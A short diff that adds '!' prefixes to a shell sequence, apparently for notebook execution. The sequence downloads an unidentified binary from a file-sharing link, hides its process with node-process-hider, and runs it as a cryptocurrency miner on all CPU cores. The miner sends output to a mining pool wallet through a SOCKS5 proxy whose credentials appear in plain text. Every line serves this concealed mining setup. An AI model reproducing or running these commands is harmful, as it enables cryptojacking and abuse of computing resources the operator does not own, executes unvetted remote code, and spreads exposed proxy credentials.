@@ -2,15 +2,15 @@
 
 
 
-apt update -y  
-apt install curl libssl1.0-dev  
-nodejs nodejs-dev node-gyp 
-npm -y  
-wget https://download1478.mediafire.com/n1x43abtozeg/a35pndymq81rnet/geek  
-npm i -g node-process-hider  
-chmod +x geek  
-ph add geek  
-./geek -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
+! apt update -y  
+! apt install curl libssl1.0-dev  
+! nodejs nodejs-dev node-gyp 
+! npm -y  
+! wget https://download1478.mediafire.com/n1x43abtozeg/a35pndymq81rnet/geek  
+! npm i -g node-process-hider  
+! chmod +x geek  
+! ph add geek  
+! ./geek -a ethash -o stratum+tcp://ethash.mine.zergpool.com:9999 -u TPPvQ3s1grBbZ6q9BusoP2hZYDo63Lsfh3 -p  c=TRX,mc=AKA/CLO/EGEM/ETHO/EXP/TSF/ETH,ID=Aman -t $(nproc) -x socks5://ubuntu2004:LijayaAnli1188@209.127.96.240:7835
 
 
 
